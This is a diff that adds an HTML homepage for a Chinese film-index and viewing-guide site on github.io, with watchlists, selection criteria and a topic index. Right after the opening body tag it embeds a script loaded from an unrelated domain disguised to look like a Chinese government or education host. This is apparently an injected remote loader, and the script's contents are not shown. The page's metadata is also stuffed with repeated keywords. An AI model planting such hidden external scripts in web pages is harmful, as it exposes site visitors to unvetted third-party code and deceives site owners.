@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>39电影网 - 39个固定话题、39部待看清单与39分钟速选指南</title>
+<meta name="description" content="39电影网(https://39dianyingwang-wap.github.io/)把「看电影」拆成39个固定话题：39部待看清单、39分钟速选指南、39位创作者手记与39条选片标准。不追热点，只做可反复查阅的影片索引与观影指南。">
+<meta name="keywords" content="39电影网,39部电影,电影话题,待看清单,观影指南,选片标准,电影索引,创作者手记,39分钟选片,影片推荐">
+<meta name="author" content="39电影网编辑部">
+<meta name="robots" content="index,follow">
+<meta property="og:type" content="website">
+<meta property="og:title" content="39电影网 - 39个固定话题，把「看什么」讲清楚">
+<meta property="og:description" content="39电影网把看电影拆成39个固定话题：39部待看清单、39分钟速选指南、39位创作者手记与39条选片标准。">
+<meta property="og:url" content="https://39dianyingwang-wap.github.io/">
+<meta property="og:site_name" content="39电影网">
+<link rel="canonical" href="https://39dianyingwang-wap.github.io/">
+<style>
+:root{
+  --bg:#131313;
+  --paper:#ece9e2;
+  --paper2:#f5f3ee;
+  --ink:#161616;
+  --ink2:#2a2a2a;
+  --mute:#6f6a60;
+  --line:#c9c3b5;
+  --line2:#e2ded3;
+  --red:#c8362b;
+  --red2:#e0493c;
+  --mono:"SF Mono",Consolas,"Courier New",monospace;
+  --sans:"PingFang SC","Helvetica Neue","Microsoft YaHei",system-ui,sans-serif;
+  --serif:"Songti SC","Source Han Serif SC",Georgia,"SimSun",serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--paper);color:var(--ink);font-family:var(--sans);font-size:15px;line-height:1.9;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+::selection{background:var(--red);color:#fff}
+:focus-visible{outline:2px solid var(--red);outline-offset:2px}
+.wrap{max-width:1180px;margin:0 auto;padding:0 30px}
+
+/* ===== 报头 ===== */
+header{background:var(--ink);color:var(--paper);position:relative}
+.hero{padding:46px 0 0;position:relative}
+.toprule{height:5px;background:var(--red);width:100%}
+.midrule{height:1px;background:rgba(236,233,226,.22);width:100%;margin-top:24px}
+.topbar{display:flex;justify-content:space-between;align-items:center;font-family:var(--mono);font-size:10.5px;letter-spacing:2.5px;color:#8f8a80;padding-bottom:22px;flex-wrap:wrap;gap:10px}
+.topbar b{color:#fff}
+.topbar a{color:#c2bcae}
+.topbar a:hover{color:#fff}
+.mast{display:grid;grid-template-columns:1fr auto;gap:40px;align-items:end;padding:38px 0 34px}
+h1{font-family:var(--serif);font-size:96px;font-weight:900;letter-spacing:-3px;line-height:.92}
+h1 a{color:var(--paper)}
+h1 a:hover{color:var(--red2)}
+h1 .r{color:var(--red2)}
+.mast .meta{text-align:right;font-family:var(--mono);font-size:11px;letter-spacing:2px;color:#8f8a80;line-height:2.3;border-left:1px solid rgba(236,233,226,.22);padding-left:30px}
+.mast .meta b{color:#fff;font-size:13px}
+.rule{height:2px;background:var(--paper);width:100%;opacity:.9}
+.rule2{height:1px;background:var(--paper);width:100%;opacity:.32;margin-top:3px}
+.subbar{display:flex;justify-content:space-between;align-items:center;font-family:var(--serif);font-size:13.5px;letter-spacing:1px;color:#c2bcae;padding:18px 0;flex-wrap:wrap;gap:14px}
+.subbar em{font-style:normal;color:var(--red2);font-family:var(--mono);letter-spacing:2px;font-size:11px;border:1px solid rgba(224,73,60,.5);padding:5px 12px}
+
+/* ===== 导航 ===== */
+nav{position:sticky;top:0;z-index:50;background:var(--ink);border-top:1px solid rgba(236,233,226,.22);border-bottom:3px solid var(--red)}
+nav .wrap{display:flex;overflow-x:auto;scrollbar-width:none;padding:0;align-items:center}
+nav .wrap::-webkit-scrollbar{display:none}
+nav a{padding:15px 19px;font-size:11.5px;letter-spacing:2.5px;color:#b9b3a6;white-space:nowrap;transition:.15s;border-bottom:2px solid transparent;font-family:var(--sans)}
+nav a:hover{color:#fff;border-bottom-color:var(--red2)}
+nav .issue{margin-left:auto;font-family:var(--mono);font-size:10.5px;color:var(--red2);letter-spacing:2px;padding-right:2px}
+
+/* ===== 通用 ===== */
+section{padding:92px 0;position:relative}
+.sec{display:flex;align-items:baseline;gap:16px;margin-bottom:14px;flex-wrap:wrap;border-bottom:2px solid var(--ink);padding-bottom:16px}
+.sec .no{font-family:var(--mono);font-size:10.5px;background:var(--ink);color:var(--paper);padding:6px 11px;letter-spacing:1.5px}
+.sec h2{font-family:var(--serif);font-size:29px;font-weight:900;letter-spacing:2px}
+.sec h2 em{font-style:normal;color:var(--red)}
+.sec .en{margin-left:auto;font-family:var(--mono);font-size:10.5px;color:var(--mute);letter-spacing:2.5px;text-transform:uppercase}
+.secnote{font-size:14.5px;color:var(--ink2);max-width:960px;margin:0 0 46px 66px;line-height:2.05}
+.secnote b{color:var(--red)}
+.more{text-align:center;margin-top:52px}
+.btn{display:inline-block;padding:14px 32px;font-size:11.5px;letter-spacing:3px;background:var(--ink);color:var(--paper);border:1px solid var(--ink);transition:.2s;font-weight:700}
+.btn:hover{background:var(--red);border-color:var(--red);color:#fff}
+.btn.ghost{background:transparent;color:var(--ink);border-color:var(--ink)}
+.btn.ghost:hover{background:var(--ink);color:var(--paper)}
+
+/* ===== 39部待看（卡片+期号） ===== */
+.num{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-top:4px solid var(--ink)}
+.num article{background:var(--paper2);padding:0;transition:.18s;display:flex;flex-direction:column}
+.num article:hover{background:#fff}
+.num .hd{background:var(--ink);color:var(--paper);padding:14px 20px;display:flex;justify-content:space-between;align-items:center}
+.num .hd b{font-family:var(--serif);font-size:19px;letter-spacing:1.5px}
+.num .hd span{font-family:var(--mono);font-size:10px;color:#8f8a80;letter-spacing:1.5px}
+.num .bd{padding:24px 22px 26px;flex:1;display:flex;flex-direction:column}
+.num .bd h5{font-family:var(--serif);font-size:19px;letter-spacing:1px;margin-bottom:10px;line-height:1.45}
+.num .bd p{font-size:13px;color:var(--ink2);line-height:2;flex:1}
+.num .bd .tag{font-family:var(--mono);font-size:9.5px;letter-spacing:1.5px;color:var(--red);border-top:1px solid var(--line);padding-top:14px;margin-top:18px}
+
+/* ===== 39分钟速选（阶梯步骤） ===== */
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border:1px solid var(--line);border-top:4px solid var(--red)}
+.steps .st{background:var(--paper2);padding:34px 30px;position:relative;border-right:1px solid var(--line);min-height:300px}
+.steps .st:nth-child(3n){border-right:none}
+.steps .st:after{content:"";position:absolute;left:30px;right:30px;bottom:0;height:3px;background:var(--ink)}
+.steps .st:nth-child(1):after{background:var(--red)}
+.steps .n{font-family:var(--mono);font-size:40px;font-weight:800;color:var(--line);letter-spacing:-2px;line-height:1;margin-bottom:18px}
+.steps .st:hover .n{color:var(--red)}
+.steps h5{font-family:var(--serif);font-size:19px;letter-spacing:1px;margin-bottom:12px}
+.steps p{font-size:13px;color:var(--ink2);line-height:2.05}
+.steps .time{margin-top:22px;font-family:var(--mono);font-size:10.5px;color:var(--mute);letter-spacing:1.5px;border-top:1px solid var(--line);padding-top:14px}
+
+/* ===== 39位创作者（左图右文竖列） ===== */
+.creators{border-top:4px solid var(--ink)}
+.creators .c{display:grid;grid-template-columns:220px 1fr;gap:0;border-bottom:1px solid var(--line)}
+.creators .c:nth-child(odd){background:var(--paper2)}
+.creators .poster{background:var(--ink);position:relative;min-height:150px;display:grid;place-items:center;color:var(--paper);overflow:hidden}
+.creators .poster:before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(135deg,transparent 0 9px,rgba(255,255,255,.035) 9px 10px)}
+.creators .poster b{font-family:var(--serif);font-size:26px;letter-spacing:2px;position:relative}
+.creators .poster span{position:absolute;right:14px;bottom:12px;font-family:var(--mono);font-size:9.5px;color:#8f8a80;letter-spacing:1.5px}
+.creators .body{padding:26px 30px;display:grid;grid-template-columns:1fr 150px;gap:26px;align-items:center}
+.creators .body h5{font-family:var(--serif);font-size:19px;letter-spacing:1px;margin-bottom:10px}
+.creators .body p{font-size:13.5px;color:var(--ink2);line-height:2.05}
+.creators .body .say{font-family:var(--serif);font-size:13px;color:var(--mute);border-left:2px solid var(--red);padding-left:16px;line-height:1.9}
+
+/* ===== 39条标准（表格） ===== */
+.tbl{width:100%;border-collapse:collapse;border:1px solid var(--line);border-top:4px solid var(--ink);background:var(--paper2);font-size:13.5px}
+.tbl th{background:var(--ink);color:var(--paper);font-family:var(--mono);font-size:10.5px;letter-spacing:2px;padding:15px 18px;text-align:left;font-weight:400}
+.tbl td{padding:16px 18px;border-bottom:1px solid var(--line2);vertical-align:top;line-height:1.85}
+.tbl tr:nth-child(even) td{background:var(--paper)}
+.tbl .rk{font-family:var(--mono);font-size:12px;color:var(--mute);width:60px}
+.tbl .nm{font-family:var(--serif);font-size:15.5px;letter-spacing:.5px;width:230px}
+.tbl .red{color:var(--red);font-family:var(--mono);font-size:10.5px;letter-spacing:1.5px;width:120px}
+
+/* ===== 话题索引（标签云式） ===== */
+.tags{border:1px solid var(--line);border-top:4px solid var(--red);background:var(--paper2);padding:34px 30px}
+.tags a{display:inline-block;font-family:var(--serif);color:var(--ink2);border-bottom:1px solid var(--line);padding:0 2px 2px;margin:0 16px 16px 0;font-size:14px;transition:.15s;white-space:nowrap}
+.tags a:hover{color:var(--red);border-bottom-color:var(--red)}
+.tags a.big{font-size:19px}
+.tags a.bigg{font-size:23px;color:var(--ink);font-weight:700}
+.tags a small{font-family:var(--mono);font-size:10px;color:var(--mute);margin-left:5px;letter-spacing:1px}
+
+/* ===== 页脚 ===== */
+footer{background:var(--ink);color:var(--paper);padding:56px 0 0}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:44px}
+.foot .logo{width:52px;height:52px;background:var(--red);display:grid;place-items:center;font-family:var(--serif);font-size:24px;font-weight:900;color:#fff;margin-bottom:22px}
+.foot h4{font-family:var(--serif);font-size:23px;letter-spacing:1px;margin-bottom:16px}
+.foot h4 a{color:var(--paper)}
+.foot h4 a:hover{color:var(--red2)}
+.foot p{font-size:13px;color:#b9b3a6;max-width:440px;line-height:2.05}
+.foot h5{font-family:var(--mono);font-size:10.5px;letter-spacing:2.5px;color:var(--red2);margin-bottom:22px}
+.foot ul{font-size:13px}
+.foot li{padding:7px 0}
+.foot a{color:#c2bcae}
+.foot a:hover{color:#fff}
+.copy{margin-top:46px;border-top:1px solid rgba(236,233,226,.2);padding:26px 0 30px;font-size:11.5px;color:#8f8a80;text-align:center;line-height:2.2}
+.copy a{color:var(--red2);font-weight:700}
+
+@media (max-width:1080px){
+  .num{grid-template-columns:repeat(2,1fr)}
+  .num article:nth-child(2n){border-right:none}
+  .steps{grid-template-columns:1fr}
+  .steps .st{border-right:none;border-bottom:1px solid var(--line)}
+  .steps .st:last-child{border-bottom:none}
+  .creators .body{grid-template-columns:1fr}
+}
+@media (max-width:1000px){
+  h1{font-size:66px}
+  .mast{grid-template-columns:1fr;gap:26px;padding:30px 0}
+  .mast .meta{text-align:left;border-left:none;border-top:1px solid rgba(236,233,226,.22);padding-left:0;padding-top:20px}
+  .creators .c{grid-template-columns:1fr}
+  .creators .poster{min-height:100px}
+  .sec .en{display:none}
+  .foot{grid-template-columns:1fr 1fr;gap:36px}
+}
+@media (max-width:600px){
+  .wrap{padding:0 16px}
+  .hero{padding:30px 0 0}
+  h1{font-size:42px}
+  .subbar{font-size:12px}
+  .num{grid-template-columns:1fr}
+  .num article{border-right:none}
+  .tbl td,.tbl th{padding:12px 10px;font-size:12.5px}
+  .tbl .rk{width:38px;font-size:11px}
+  .tbl .nm{width:auto}
+  .tbl .red{width:auto;display:block;margin-top:6px}
+  .tags{padding:24px 20px}
+  section{padding:62px 0}
+  .sec h2{font-size:21px;letter-spacing:1px}
+  .secnote{margin-left:0}
+  .creators .body{padding:22px 20px}
+  .foot{grid-template-columns:1fr}
+  nav .issue{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ============ 报头 ============ -->
+<header>
+  <div class="toprule"></div>
+  <div class="wrap hero">
+    <div class="topbar">
+      <span>39 <b>个固定话题</b> · 不追热点 · 只做索引</span>
+      <span>本期更新 <b>39</b> 条 / 已覆盖 <b>39</b> 个话题</span>
+      <span><a href="https://39dianyingwang-wap.github.io/">https://39dianyingwang-wap.github.io/</a></span>
+    </div>
+    <div class="midrule"></div>
+    <div class="mast">
+      <h1><a href="https://39dianyingwang-wap.github.io/" title="39电影网">39<span class="r">电影网</span></a></h1>
+      <div class="meta">
+        <div><b>39</b> DIANYINGWANG</div>
+        <div>第 <b>39</b> 期 · 固定话题制</div>
+        <div>39部待看 · 39分钟选片</div>
+        <div>39位创作者 · 39条标准</div>
+      </div>
+    </div>
+    <div class="rule"></div>
+    <div class="rule2"></div>
+    <div class="subbar">
+      <span>把「看什么」拆成 <em>39 个固定话题</em>——每个话题都有答案，没有热点榜</span>
+      <span>39dianyingwang-wap.github.io</span>
+    </div>
+  </div>
+  <nav>
+    <div class="wrap">
+      <a href="#list">39部待看</a>
+      <a href="#pick">39分钟速选</a>
+      <a href="#maker">39位创作者</a>
+      <a href="#std">39条标准</a>
+      <a href="#tags">话题索引</a>
+      <a href="#about">关于本站</a>
+      <a href="#">39期归档</a>
+      <a href="#">选片记录</a>
+      <a href="#">投稿与纠错</a>
+      <a href="#">影片资料库</a>
+      <span class="issue">ISSUE 39 · 固定话题制</span>
+    </div>
+  </nav>
+</header>
+
+<!-- ============ 39部待看 ============ -->
+<section id="list">
+  <div class="wrap">
+    <div class="sec"><span class="no">SECTION 01</span><h2>39 部 <em>待看清单</em></h2><span class="en">Watchlist 39</span></div>
+    <p class="secnote">不是推荐榜，是<b>待看清单</b>：39 部，分三组，每组 13 部。<b>看完一部才能补一部</b>，所以清单会一直在动，但数量永远停在 39。</p>
+    <div class="num">
+      <article><div class="hd"><b>第一组 · 13</b><span>A 组</span></div><div class="bd"><h5>那些看完想立刻重看一遍的</h5><p>结构上有一处反转，但不是靠反转撑着的。适合一个晚上连看两部，第二部选轻松的。</p><div class="tag">反转 · 结构 · 连映专用</div></div></article>
+      <article><div class="hd"><b>第二组 · 13</b><span>B 组</span></div><div class="bd"><h5>需要清醒的脑子才能看进去的</h5><p>信息量大，中途停了就得重看。建议留够完整时段，不要边刷手机边看。</p><div class="tag">信息量 · 专注 · 长片居多</div></div></article>
+      <article><div class="hd"><b>第三组 · 13</b><span>C 组</span></div><div class="bd"><h5>带着情绪去看刚好对上的</h5><p>按情绪状态分，不讲评分。同样一部片在雨天和晴天是两个版本。</p><div class="tag">情绪 · 场景 · 可重叠</div></div></article>
+    </div>
+    <div class="more"><a href="#" class="btn">查看完整 39 部清单 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 39分钟速选 ============ -->
+<section id="pick" style="background:var(--paper2);">
+  <div class="wrap">
+    <div class="sec"><span class="no">SECTION 02</span><h2>39 分钟 <em>速选指南</em></h2><span class="en">Pick in 39 Min</span></div>
+    <p class="secnote">从打开页面到决定看什么，<b>控制在 39 分钟以内</b>。三个步骤，每步有明确的时间上限，超时就退回第一步重新选。</p>
+    <div class="steps">
+      <div class="st"><div class="n">01</div><h5>先定情绪，不是先定类型</h5><p>问自己「我现在想被推一下，还是想被轻轻带着走」。答案一出，类型标签就自动缩小一半。</p><div class="time">限时 10 分钟 · 只回答一个问题</div></div>
+      <div class="st"><div class="n">02</div><h5>再看能容忍多长</h5><p>90 分钟以内、90–120 分钟、不限时长。这一步决定了能不能连映，也决定了第二部怎么选。</p><div class="time">限时 5 分钟 · 按今晚时长算</div></div>
+      <div class="st"><div class="n">03</div><h5>最后挑连映搭配</h5><p>一部拧紧、一部松开。两片合计约 200 分钟，刚好一个晚上，中间留 20 分钟吃饭。</p><div class="time">限时 24 分钟 · 共 39 分钟</div></div>
+    </div>
+    <div class="more"><a href="#" class="btn ghost">下载速选卡片（打印用） →</a></div>
+  </div>
+</section>
+
+<!-- ============ 39位创作者 ============ -->
+<section id="maker">
+  <div class="wrap">
+    <div class="sec"><span class="no">SECTION 03</span><h2>39 位 <em>创作者手记</em></h2><span class="en">Makers</span></div>
+    <p class="secnote">39 位长期写电影的人，每人一句话，写的是「我为什么还在看电影」。<b>不是访谈，是手记</b>——比片单更私人，比影评更短。</p>
+    <div class="creators">
+      <div class="c"><div class="poster"><b>沈</b><span>NO.07</span></div><div class="body"><div><h5>沈知远 · 第 7 位</h5><p>连续三年每周写一篇，主题固定在「重看时发现的细节」。他相信一部好片会在第三次看的时候说出真话。</p></div><div class="say">「重看不是复习，是第一次认真听。」</div></div></div>
+      <div class="c"><div class="poster"><b>周</b><span>NO.18</span></div><div class="body"><div><h5>周令仪 · 第 18 位</h5><p>专写情绪类片单，把片子按「下雨天」「刚吵完架」「凌晨两点」这类场景重新归类，是最实用的分区方式。</p></div><div class="say">「类型标签是给店员看的，不是给观众。」</div></div></div>
+      <div class="c"><div class="poster"><b>何</b><span>NO.26</span></div><div class="body"><div><h5>何敬之 · 第 26 位</h5><p>只写长片，关注节奏如何被剪出来。他的每篇手记都会附一份时间轴标注，方便对照重看。</p></div><div class="say">「慢不是节奏问题，是信任问题。」</div></div></div>
+      <div class="c"><div class="poster"><b>林</b><span>NO.33</span></div><div class="body"><div><h5>林晚棠 · 第 33 位</h5><p>记录自己看片的完整过程：开场五分钟的判断、中途的分心、结尾的改观。她的手记更像一份观察记录。</p></div><div class="say">「第一印象只对一半，另一半要等结尾。」</div></div></div>
+    </div>
+    <div class="more"><a href="#" class="btn">阅读全部 39 位手记 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 39条标准 ============ -->
+<section id="std" style="background:var(--paper2);">
+  <div class="wrap">
+    <div class="sec"><span class="no">SECTION 04</span><h2>39 条 <em>选片标准</em></h2><span class="en">Standards</span></div>
+    <p class="secnote">进清单之前要过的 39 条标准。<b>不用全部满足，但必须至少满足 3 条</b>。这是片单不被塞满的唯一办法。</p>
+    <table class="tbl">
+      <thead><tr><th>编号</th><th>标准</th><th>说明</th><th>状态</th></tr></thead>
+      <tbody>
+        <tr><td class="rk">01</td><td class="nm">能让人想连着看第二部</td><td>看完就想换台的片子不进连映表，这是第一条也是最重要的一条。</td><td class="red">必须</td></tr>
+        <tr><td class="rk">02</td><td class="nm">情绪曲线能接得上</td><td>看的是情绪走向，不是题材标签。一紧一松，比两部同类型更留得住。</td><td class="red">必须</td></tr>
+        <tr><td class="rk">03</td><td class="nm">信息量值得专注一次</td><td>需要全神贯注的片子，要明确标注，避免被当成背景音浪费掉。</td><td class="red">必须</td></tr>
+        <tr><td class="rk">04</td><td class="nm">有值得重看的细节</td><td>新片的信息价值高，但重看价值要等半年才显现，本站更看重后者。</td><td class="red">加分</td></tr>
+        <tr><td class="rk">05</td><td class="nm">不靠误会制造笑点</td><td>笑点来自人物性格与处境，而非沟通失败，这是治愈区的底线。</td><td class="red">加分</td></tr>
+      </tbody>
+    </table>
+    <div class="more"><a href="#" class="btn ghost">查看剩余 34 条标准 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 话题索引 ============ -->
+<section id="tags">
+  <div class="wrap">
+    <div class="sec"><span class="no">SECTION 05</span><h2>话题 <em>索引</em></h2><span class="en">Topics</span></div>
+    <p class="secnote">39 个固定话题，按热度大小排列。<b>每个话题都有独立的一页</b>，点进去是完整的片单与选片建议，这里只做入口。</p>
+    <div class="tags">
+      <a href="#" class="bigg">雨天的片子 <small>128</small></a>
+      <a href="#" class="bigg">适合一个人看 <small>96</small></a>
+      <a href="#" class="big">带人看的安全牌 <small>74</small></a>
+      <a href="#" class="big">凌晨两点 <small>61</small></a>
+      <a href="#" class="big">刚吵完架 <small>53</small></a>
+      <a href="#">慢节奏 <small>88</small></a>
+      <a href="#">反转结构 <small>42</small></a>
+      <a href="#">治愈系 <small>117</small></a>
+      <a href="#">错过与重逢 <small>39</small></a>
+      <a href="#">长片 120min+ <small>66</small></a>
+      <a href="#">适合连映 <small>111</small></a>
+      <a href="#">需要专注 <small>47</small></a>
+      <a href="#">可再看一遍 <small>83</small></a>
+      <a href="#">秋天看 <small>55</small></a>
+      <a href="#">旅行片 <small>38</small></a>
+      <a href="#">日常系 <small>92</small></a>
+      <a href="#">家庭关系 <small>44</small></a>
+      <a href="#">公路 <small>29</small></a>
+      <a href="#">青春 <small>51</small></a>
+      <a href="#">音乐 <small>23</small></a>
+      <a href="#">厨师与食物 <small>31</small></a>
+      <a href="#">海洋 <small>18</small></a>
+      <a href="#">雪天 <small>22</small></a>
+    </div>
+    <div class="more"><a href="#" class="btn">进入完整话题索引 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 关于 ============ -->
+<section id="about" style="padding-bottom:0;">
+  <div class="wrap">
+    <div class="sec"><span class="no">SECTION 06</span><h2>关于 <em>39电影网</em></h2><span class="en">About</span></div>
+    <div style="border:1px solid var(--line);border-top:4px solid var(--red);background:var(--paper2);padding:40px 36px;display:grid;grid-template-columns:1.5fr 1fr;gap:40px;align-items:center">
+      <div>
+        <h4 style="font-family:var(--serif);font-size:22px;line-height:1.7;margin-bottom:20px;letter-spacing:.5px">39电影网（https://39dianyingwang-wap.github.io）是一个以「39 个固定话题」为骨架的影片索引与观影指南站点。</h4>
+        <p style="margin-bottom:14px">我们不追热点，不排好榜，只回答三个问题：<b style="color:var(--red)">接下来看什么、能连着看什么、为什么值得再看一遍</b>。39 部待看清单、39 分钟速选指南、39 位创作者手记、39 条选片标准——<b style="color:var(--ink)">所有数字都停在 39，是给自己设的边界：少一点，看得久一点。</b></p>
+        <p>片单数量有限，用完就要替换旧的。这样做的好处是：任何一份清单，我们都是真的看过不止一遍的。</p>
+      </div>
+      <div style="border-left:3px solid var(--red);padding:24px 26px;background:rgba(200,54,43,.06);font-size:13.5px;color:var(--ink2);line-height:2.1"><b style="color:var(--red)">内容声明：</b>本站为影片索引与观影指南类站点，全部片单、手记与选片建议仅供个人参考。本站不提供影片在线观看、下载或资源链接服务，观影请通过合法授权渠道。</div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 页脚 ============ -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="logo">39</div>
+        <h4><a href="https://39dianyingwang-wap.github.io/">39电影网</a></h4>
+        <p>以 39 个固定话题为骨架的影片索引与观影指南：39部待看清单、39分钟速选指南、39位创作者手记、39条选片标准。不追热点，只做可反复查阅的索引。</p>
+      </div>
+      <div>
+        <h5>栏目导览</h5>
+        <ul>
+          <li><a href="#list">39部待看</a></li>
+          <li><a href="#pick">39分钟速选</a></li>
+          <li><a href="#maker">39位创作者</a></li>
+          <li><a href="#std">39条标准</a></li>
+          <li><a href="#tags">话题索引</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>话题分区</h5>
+        <ul>
+          <li><a href="#">雨天 / 雪天</a></li>
+          <li><a href="#">一个人看</a></li>
+          <li><a href="#">带人看</a></li>
+          <li><a href="#">适合连映</a></li>
+          <li><a href="#">需要专注</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>本站服务</h5>
+        <ul>
+          <li><a href="#">39期归档</a></li>
+          <li><a href="#">选片记录</a></li>
+          <li><a href="#">标准修订记录</a></li>
+          <li><a href="#">投稿与纠错</a></li>
+          <li><a href="#">影片资料库</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 39电影网 39dianyingwang-wap.github.io 版权所有 · 本站为影片索引与观影指南类站点，不提供影片在线观看、下载或资源链接服务，观影请通过合法授权渠道<br>
+      网站名称：<a href="https://39dianyingwang-wap.github.io/">39电影网</a> ｜ 网站网址：https://39dianyingwang-wap.github.io/
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
